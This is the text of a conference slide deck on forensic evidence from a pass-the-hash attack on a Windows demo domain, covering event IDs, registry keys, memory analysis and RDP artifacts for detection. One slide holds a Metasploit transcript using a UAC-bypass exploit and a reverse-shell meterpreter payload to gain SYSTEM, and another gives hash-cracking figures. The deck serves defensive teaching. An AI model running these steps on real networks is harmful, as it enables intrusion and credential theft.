FORENSIC ARTIFACTS FROM A 
PASS THE HASH (PTH) ATTACK
BY: GERARD LAYGUI
DISCLAIMER: THE VIEWS AND 
OPINIONS EXPRESSED IN THIS 
PRESENTATION ARE THOSE OF THE 
AUTHOR’S AND DOES NOT
NECESSARILY REPRESENT THE 
OFFICIAL POLICY OR POSITION OF 
THE COMPANY THAT THE AUTHOR 
WORKS FOR.
WHAT IS A HASH?
A HASH FUNCTION IS ANY FUNCTION THAT CAN 
BE USED TO MAP DIGITAL DATA OF ARBITRARY SIZE 
TO DIGITAL DATA OF FIXED SIZE.  IN THE CASE OF 
WINDOWS, A PASSWORD IS STORED IN EITHER A 
LANMAN (LM) HASH OR NT LAN MANAGER (NTLM) 
HASH FORMAT.
WHERE ARE HASHES STORED?
• The Security Accounts Manager (SAM) database.
• Local Security Authority Subsystem (LSASS) process 
memory.
• Domain Active Directory Database (domain 
controllers only).
• The Credential Manager (CredMan) store.
• LSA Secrets in the registry.
HASH EXAMPLES
• Plaintext = password
• LM Hash 
E52CAC67419A9A224A3B108F3FA6CB6D
• NTLM Hash 
8846F7EAEE8FB117AD06BDD830B7586C
PASS THE HASH (PTH)
“Pass the hash is a hacking technique that allows an 
attacker to authenticate to a remote server/service by 
using the underlying NTLM and/or LanMan hash of a 
user's password, instead of requiring the associated 
plaintext password.”
In this case, hash == password
DEMO ENVIRONMENT - LOGGING CHANGES
• Audit logon events - Success & Failure
• Audit account management - Success & Failure
• Audit account logon events - Success & Failure
• Audit process tracking - Success & Failure
• Audit system events - Success & Failure
• Increase log file sizes
Microsoft Audit Policy Recommendations -
https://technet.microsoft.com/en-us/library/dn487457.aspx
DEMO DOMAIN
Client  
Windows 
7
Client 2
Member 
Server 
W2K8 R2
Member 
Server 2
W2K12 
Domain 
Controller
ImaUser
ImaDomainAdmin
S-1-5-
21domain-
500
S-1-5-
21domain-
500
Windows 2012 Native Mode
Domain Name: OHNOES.INTERNAL
PASS THE HASH ATTACK SEQUENCE
Compromise
Elevate Privilege
Scrape Hashes
Recon
Leave Backdoor (Optional) 
Crack Hashes (Optional)
Pass The Hash
Pass The Hash
Recon
Scrape Hashes
Elevate Privilege
Extract Active 
Directory
DEMO PASS THE HASH
FORENSIC EVIDENCE
• Volatile
• At Least - Network (pcap, routes, netstat), 
Process List
• Best - RAM Memory Captures, hiberfil.sys
• VMWare - Suspend VM, use vmem file
• Non-Volatile
• At Least - Event Logs, Registry, Systeminfo
• Best - Disk Images
• VMWare - Use VMDK
ANALYSIS TOOLS - VOLATILE
• Dump Memory
• HBGary - FDPro
• Mandiant Memoryze
• Analyze Memory
• Volatility (Free)
• HBGary Responder Pro
ANALYSIS TOOLS – NON-VOLATILE
• Creating Disk Images
• Linux dd
• Encase
• FTK
• Analyze Disk Images
• The Sleuth Kit / Autopsy
• Log2Timeline
• Encase
• FTK
COMPROMISE
• Windows Security Event Log (Process Audit Success)
• Security Event ID 4688 Process Creation
COMPROMISE
• Prefetch – Disk Artifact (Note:  No artifacts if using 
a SSD or if using Windows Server OS)
• Time stamps reveal when a program was launched 
COMPROMISE
• Shim Cache
• Registry – regripper
• Memory – volatility (shimcache switch)
COMPROMISE
• Memory - Volatility
• Malfind command
BACKDOOR
• Windows Security Event Log - Persistence
• Security Event ID 4720 - User account created
• Security Event ID 4732 – User added to groups
BACKDOOR
• Registry (Regripper)
• Run Keys
•
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curr
entVersion\Run
•
HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre
ntVersion\Run
• Service Install Date
PRIVILEGE ESCALATION
In order to scrape hashes, the attacker 
needs to change security context from user 
to Local System (SID S-1-5-18)
User
Administrator
LOCAL SYSTEM
PRIVILEGE ESCALATION
Using Kali after I’ve already compromised the system using a Java exploit.
meterpreter > run post/windows/gather/win_privs
meterpreter > background
msf exploit(java_signed_applet) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > set SESSION 1
SESSION => 1
msf exploit(bypassuac) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(bypassuac) > set LHOST 10.1.1.251
LHOST => 10.1.1.251
msf exploit(bypassuac) > set LPORT 8088
LPORT => 8088
msf exploit(bypassuac) > exploit
meterpreter > getuid
Server username: OHNOES\ImaUser
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
PRIVILEGE ESCALATION
SCRAPING HASHES
• Service Install  Process Start
SCRAPING HASHES
• Service Install  Process Start
SCRAPING HASHES
Volatility – consoles command
CRACKING NT HASHES
• John The Ripper
• OCLHashCat (GPU)
• Ubuntu 14.04 - 8x AMD R9 290X can do 
183528 Mh/s against NTLM, that is 
183,528,000,000 tries per second*.
• Roughly 9 hours to crack an 8 character 
password
RECON
Volatility – consoles or cmdscan
RECON – APT STYLE
LATERAL MOVEMENT
• Event ID 4624 – Logon / Event ID 
4634 - Logoff
• Type 2 – Interactive
• Type 3 - Network Logon
• Type 10 – Remote Interactive 
(RDP)
LATERAL MOVEMENT
• RDP Pivot
• Microsoft-Windows-TerminalServices-
LocalSessionManager-Operational Event ID 21 
(RDP Logon)
• Microsoft-Windows-TerminalServices-
LocalSessionManager-Operational Event ID 25 
(RDP Reconnect)
LATERAL MOVEMENT
• RDP Pivot Continued
• Default.rdp disk artifact
• BMC Cache (bcache22.bmc)
QUESTIONS?
This slide deck and related links for the videos will be eventually posted on:
Cybersecology.com/DEFCON2015
Big thanks to Mike Landeck for allowing me to use his site!